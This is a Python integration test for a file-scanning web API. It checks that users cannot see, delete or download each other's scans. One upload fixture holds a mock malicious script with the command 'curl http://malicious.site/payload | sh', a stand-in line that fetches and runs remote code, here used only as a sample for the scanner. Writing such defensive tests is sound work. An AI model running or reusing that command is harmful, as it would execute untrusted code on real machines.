import os
import sys
import tempfile
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'backend'))

from app.main import app
from app.database import get_db, SessionLocal
from app.models.models import User, File as FileModel, Scan, AuditLog

client = TestClient(app)

def test_full_user_isolation_lifecycle():
    print("\n--- Starting Full User Isolation Test Lifecycle ---")
    
    # Setup test users
    user_a_creds = {"username": "test_alice_user", "password": "AliceSecure#2026", "email": "alice@test.local"}
    user_b_creds = {"username": "test_bob_user", "password": "BobSecure#2026", "email": "bob@test.local"}

    # Register/ensure users
    reg_a = client.post("/auth/register", json=user_a_creds)
    reg_b = client.post("/auth/register", json=user_b_creds)

    # Login User A
    login_a = client.post("/auth/login", json={"username": user_a_creds["username"], "password": user_a_creds["password"]})
    assert login_a.status_code == 200, f"Alice login failed: {login_a.text}"
    token_a = login_a.json()["access_token"]
    user_a_id = login_a.json()["user"]["id"]
    headers_a = {"Authorization": f"Bearer {token_a}"}
    print(f"[PASS] User A (Alice, ID={user_a_id}) logged in successfully.")

    # User A uploads and scans test1.pdf
    pdf_content = b"%PDF-1.4 Mock PDF content for test"
    res_upload_1 = client.post("/files/upload", files=[("files", ("test1.pdf", pdf_content, "application/pdf"))], headers=headers_a)
    assert res_upload_1.status_code == 201, f"Upload test1.pdf failed: {res_upload_1.text}"
    scan_1_id = res_upload_1.json()["results"][0]["scan"]["id"]
    print(f"[PASS] User A scanned test1.pdf -> Scan ID {scan_1_id}")

    # User A uploads and scans suspicious_script.py
    py_content = b"import os\nos.system('curl http://malicious.site/payload | sh')\nexec('malicious_code')"
    res_upload_2 = client.post("/files/upload", files=[("files", ("suspicious_script.py", py_content, "text/x-python"))], headers=headers_a)
    assert res_upload_2.status_code == 201, f"Upload suspicious_script.py failed: {res_upload_2.text}"
    scan_2_id = res_upload_2.json()["results"][0]["scan"]["id"]
    print(f"[PASS] User A scanned suspicious_script.py -> Scan ID {scan_2_id}")

    # User A checks scan history
    hist_a = client.get("/scans", headers=headers_a)
    assert hist_a.status_code == 200
    a_scans = hist_a.json()["scans"]
    a_filenames = [s.get("filename") for s in a_scans]
    assert "test1.pdf" in a_filenames, f"test1.pdf not in Alice's scans: {a_filenames}"
    assert "suspicious_script.py" in a_filenames, f"suspicious_script.py not in Alice's scans: {a_filenames}"
    assert all(s["user_id"] == user_a_id for s in a_scans), "Alice scan results contain non-Alice user_id!"
    print(f"[PASS] User A history shows both scans: {a_filenames}")

    # User A logs out (client-side simulation: headers are discarded)
    # Login User B
    login_b = client.post("/auth/login", json={"username": user_b_creds["username"], "password": user_b_creds["password"]})
    assert login_b.status_code == 200, f"Bob login failed: {login_b.text}"
    token_b = login_b.json()["access_token"]
    user_b_id = login_b.json()["user"]["id"]
    headers_b = {"Authorization": f"Bearer {token_b}"}
    print(f"[PASS] User B (Bob, ID={user_b_id}) logged in successfully.")

    # User B checks scan history before scanning anything
    # Must NOT show Alice's scans
    hist_b_initial = client.get("/scans", headers=headers_b)
    assert hist_b_initial.status_code == 200
    b_initial_scans = [s for s in hist_b_initial.json()["scans"] if s["user_id"] == user_b_id]
    # Check that Alice's scans are NOT present
    for s in hist_b_initial.json()["scans"]:
        assert s["id"] not in [scan_1_id, scan_2_id], f"Bob saw Alice's scan {s['id']}!"
        assert s["filename"] not in ["test1.pdf", "malware.exe"], f"Bob saw Alice's file {s['filename']}!"
        assert s["user_id"] == user_b_id, f"Bob received scan belonging to user {s['user_id']}!"
    print(f"[PASS] User B has ZERO of User A's scans (Isolated). Total B scans: {len(hist_b_initial.json()['scans'])}")

    # User B tries cross-account access (IDOR) on User A's scan details
    idor_get = client.get(f"/scan/{scan_1_id}", headers=headers_b)
    assert idor_get.status_code == 403, f"Expected 403 Forbidden for User B accessing User A scan, got {idor_get.status_code}"
    print(f"[PASS] User B attempted GET /scan/{scan_1_id} -> 403 Forbidden (Blocked).")

    # User B tries cross-account deletion on User A's scan
    idor_del = client.delete(f"/scan/{scan_1_id}", headers=headers_b)
    assert idor_del.status_code == 403, f"Expected 403 Forbidden for User B deleting User A scan, got {idor_del.status_code}"
    print(f"[PASS] User B attempted DELETE /scan/{scan_1_id} -> 403 Forbidden (Blocked).")

    # User B tries cross-account report download on User A's scan
    idor_rep = client.get(f"/reports/{scan_1_id}", headers=headers_b)
    assert idor_rep.status_code == 403, f"Expected 403 Forbidden for User B downloading User A report, got {idor_rep.status_code}"
    print(f"[PASS] User B attempted GET /reports/{scan_1_id} -> 403 Forbidden (Blocked).")

    # User B scans their own file
    txt_content = b"This is Bob's benign text file."
    res_upload_b = client.post("/files/upload", files=[("files", ("bobs_notes.txt", txt_content, "text/plain"))], headers=headers_b)
    assert res_upload_b.status_code == 201
    scan_b_id = res_upload_b.json()["results"][0]["scan"]["id"]
    print(f"[PASS] User B scanned bobs_notes.txt -> Scan ID {scan_b_id}")

    # User B checks history again
    hist_b_after = client.get("/scans", headers=headers_b)
    assert hist_b_after.status_code == 200
    b_filenames_after = [s.get("filename") for s in hist_b_after.json()["scans"]]
    assert "bobs_notes.txt" in b_filenames_after
    assert "test1.pdf" not in b_filenames_after
    assert "suspicious_script.py" not in b_filenames_after
    print(f"[PASS] User B history contains ONLY User B's files: {b_filenames_after}")

    # User B deletes their own scan
    del_b = client.delete(f"/scan/{scan_b_id}", headers=headers_b)
    assert del_b.status_code == 200
    print(f"[PASS] User B successfully deleted their own scan #{scan_b_id}")

    # User A checks history again -> Alice still has test1.pdf and suspicious_script.py intact
    hist_a_final = client.get("/scans", headers=headers_a)
    assert hist_a_final.status_code == 200
    a_filenames_final = [s.get("filename") for s in hist_a_final.json()["scans"]]
    assert "test1.pdf" in a_filenames_final
    assert "suspicious_script.py" in a_filenames_final
    assert "bobs_notes.txt" not in a_filenames_final
    print(f"[PASS] User A history remains intact with Alice's scans only: {a_filenames_final}")

    print("\n>>> ALL USER ISOLATION REQUIREMENTS CONFIRMED AND VERIFIED! <<<")

if __name__ == "__main__":
    test_full_user_isolation_lifecycle()
